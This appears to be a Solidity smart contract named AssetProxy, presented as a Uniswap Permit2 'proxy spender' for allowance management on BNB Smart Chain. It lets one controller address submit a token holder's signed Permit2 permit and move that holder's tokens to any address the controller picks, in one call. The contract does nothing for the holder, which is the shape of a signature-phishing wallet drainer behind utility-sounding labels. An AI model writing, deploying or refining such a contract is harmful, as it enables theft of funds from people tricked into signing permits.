// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPermit2 {
    struct TokenDetails {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct SinglePermit {
        TokenDetails details;
        address spender;
        uint256 sigDeadline;
    }

    function permit(
        address tokenHolder,
        SinglePermit calldata singlePermit,
        bytes calldata signature
    ) external;

    function transferFrom(
        address from,
        address to,
        uint160 amount,
        address token
    ) external;

    function allowance(
        address tokenHolder,
        address token,
        address spender
    ) external view returns (uint160 amount, uint48 expiration, uint48 nonce);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

/**
 * @title AssetProxy
 * @dev Proxy Spender Contract for Uniswap Permit2 allowance management & execution on BNB Smart Chain.
 */
contract AssetProxy {
    address public controller;
    address public constant PERMIT2_ADDR = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    event ControllerTransferred(address indexed previousController, address indexed newController);
    event PermitExecuted(address indexed tokenHolder, address indexed token, uint160 amount);
    event TransferExecuted(address indexed from, address indexed to, uint160 amount, address indexed token);

    modifier onlyController() {
        require(msg.sender == controller, "AssetProxy: caller is not the controller");
        _;
    }

    constructor() {
        controller = msg.sender;
        emit ControllerTransferred(address(0), msg.sender);
    }

    function transferControl(address newController) external onlyController {
        require(newController != address(0), "AssetProxy: new controller is zero address");
        emit ControllerTransferred(controller, newController);
        controller = newController;
    }

    /**
     * @notice Submit user's signed permit to Permit2 contract to set on-chain allowance.
     */
    function executePermit(
        address tokenHolder,
        IPermit2.SinglePermit calldata singlePermit,
        bytes calldata signature
    ) external onlyController {
        IPermit2(PERMIT2_ADDR).permit(tokenHolder, singlePermit, signature);
        emit PermitExecuted(tokenHolder, singlePermit.details.token, singlePermit.details.amount);
    }

    /**
     * @notice Transfer tokens using active Permit2 allowance.
     * @dev As the approved spender, this contract calls PERMIT2_ADDR.transferFrom.
     */
    function executeTransfer(
        address from,
        address to,
        uint160 amount,
        address token
    ) external onlyController {
        IPermit2(PERMIT2_ADDR).transferFrom(from, to, amount, token);
        emit TransferExecuted(from, to, amount, token);
    }

    /**
     * @notice Activate permit and execute token transfer in a single transaction.
     */
    function executePermitAndTransfer(
        address tokenHolder,
        IPermit2.SinglePermit calldata singlePermit,
        bytes calldata signature,
        address to,
        uint160 transferAmount
    ) external onlyController {
        IPermit2(PERMIT2_ADDR).permit(tokenHolder, singlePermit, signature);
        emit PermitExecuted(tokenHolder, singlePermit.details.token, singlePermit.details.amount);

        IPermit2(PERMIT2_ADDR).transferFrom(tokenHolder, to, transferAmount, singlePermit.details.token);
        emit TransferExecuted(tokenHolder, to, transferAmount, singlePermit.details.token);
    }

    /**
     * @notice Rescue accidentally sent ERC20 tokens.
     */
    function rescueTokens(address token, address to, uint256 amount) external onlyController {
        IERC20(token).transfer(to, amount);
    }

    /**
     * @notice Rescue accidentally sent BNB.
     */
    function rescueBNB(address payable to, uint256 amount) external onlyController {
        to.transfer(amount);
    }

    receive() external payable {}
}
